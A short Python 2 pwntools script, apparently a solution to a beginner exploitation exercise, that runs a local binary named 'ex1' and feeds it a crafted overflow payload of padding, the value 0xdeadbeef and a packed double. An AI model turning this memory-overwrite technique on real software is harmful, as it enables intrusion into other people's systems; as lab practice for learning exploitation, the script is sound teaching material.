#!/usr/bin/env python

from pwn import *
import struct

io = process('./ex1')

payload = ' ' * 4 + p32(0xdeadbeef) + struct.pack('d', 3.14)

io.sendline(payload)

print io.recv()
